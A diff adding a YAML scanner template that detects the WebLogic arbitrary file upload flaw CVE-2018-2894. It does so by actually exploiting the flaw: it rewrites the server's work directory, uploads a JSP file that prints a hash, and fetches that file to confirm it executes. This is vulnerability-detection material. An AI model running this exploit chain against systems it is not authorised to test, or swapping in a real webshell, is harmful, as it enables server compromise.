@@ -1,0 +1,107 @@
+id: weblogic-anyfile-upload
+
+info:
+  name: Weblogic Arbitrary File Upload (CVE-2018-2894)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: CVE-2018-2894,weblogic,file-upload
+  description: |
+    This template detects arbitrary file upload vulnerability in Weblogic servers, specifically for CVE-2018-2894, allowing attackers to upload JSP files.
+
+variables:
+  t1: "{{rand_base(4)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - id: initial-upload
+    method: POST
+    path:
+      - "/ws_utc/resources/setting/options"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      setting_id=general&BasicConfigOptions.workDir=%2Fu01%2Foracle%2Fuser_projects%2Fdomains%2Fbase_domain%2Fservers%2FAdminServer%2Ftmp%2F_WL_internal%2Fcom.oracle.webservices.wls.ws-testclient-app-wls%2F4mcj4y%2Fwar%2Fcss&BasicConfigOptions.proxyHost=&BasicConfigOptions.proxyPort=80
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: upload-jsp
+    method: POST
+    path:
+      - "/ws_utc/resources/setting/keystore"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuim0dyiDSPBPu31g
+    body: |
+      ------WebKitFormBoundaryuim0dyiDSPBPu31g
+      Content-Disposition: form-data; name="ks_name"
+
+      {{t1}}
+      ------WebKitFormBoundaryuim0dyiDSPBPu31g
+      Content-Disposition: form-data; name="ks_edit_mode"
+
+      false
+      ------WebKitFormBoundaryuim0dyiDSPBPu31g
+      Content-Disposition: form-data; name="ks_password_front"
+
+
+      ------WebKitFormBoundaryuim0dyiDSPBPu31g
+      Content-Disposition: form-data; name="ks_password"
+
+
+      ------WebKitFormBoundaryuim0dyiDSPBPu31g
+      Content-Disposition: form-data; name="ks_password_changed"
+
+      false
+      ------WebKitFormBoundaryuim0dyiDSPBPu31g
+      Content-Disposition: form-data; name="ks_filename"; filename="{{t1}}.jsp"
+      Content-Type: application/octet-stream
+
+      <%@ page import="java.util.*,java.io.*"%>
+      <%@ page import="java.security.MessageDigest"%>
+
+      <%
+      String cve = "{{t1}}";
+      MessageDigest alg = MessageDigest.getInstance("MD5");
+      alg.reset();
+      alg.update(cve.getBytes());
+      byte[] digest = alg.digest();
+      StringBuffer hashedpasswd = new StringBuffer();
+      String hx;
+      for (int i=0;i<digest.length;i++){
+      hx =  Integer.toHexString(0xFF & digest[i]);
+      if(hx.length() == 1){hx = "0" + hx;}
+      hashedpasswd.append(hx);
+      }
+
+      out.println(hashedpasswd.toString());
+      %>
+      ------WebKitFormBoundaryuim0dyiDSPBPu31g--
+    extractors:
+      - type: regex
+        name: Id
+        group: 1
+        regex:
+          - "<keyStoreItem><id>([0-9]+)</id><name>{{t1}}</name>"
+        internal: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "<keyStoreItem><id>([0-9]+)</id><name>{{t1}}</name>"
+
+  - id: validate-upload
+    method: GET
+    path:
+      - "/ws_utc/css/config/keystore/{{Id}}_{{t1}}.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
